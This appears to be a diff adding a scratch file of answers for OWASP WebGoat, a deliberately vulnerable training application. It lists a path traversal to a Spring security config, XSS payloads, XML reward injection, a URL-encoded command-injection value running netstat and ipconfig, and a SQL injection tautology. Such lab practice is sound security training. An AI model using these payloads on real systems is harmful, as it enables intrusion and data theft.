@@ -1,0 +1,17 @@
+﻿WEB-INF/
+
+/../../../../../WEB-INF/spring-security.xml
+/WebGoat/plugin_extracted/plugin/AccessControlMatrix/lessonPlans\en
+
+
+<IMG SRC="images/logos/owasp.jpg"/>
+<img src=x onerror=;;alert('XSS') />
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+<reward>WebGoat Core Duo Laptop 2000 Pts</reward>
+
+<reward>WebGoat Hawaii Cruise 3000 Pts</reward>
+
+%22%20%26%20%netstat%20-an%20%26%20ipconfig
+
+101 or 1=1 order by employee_id desc
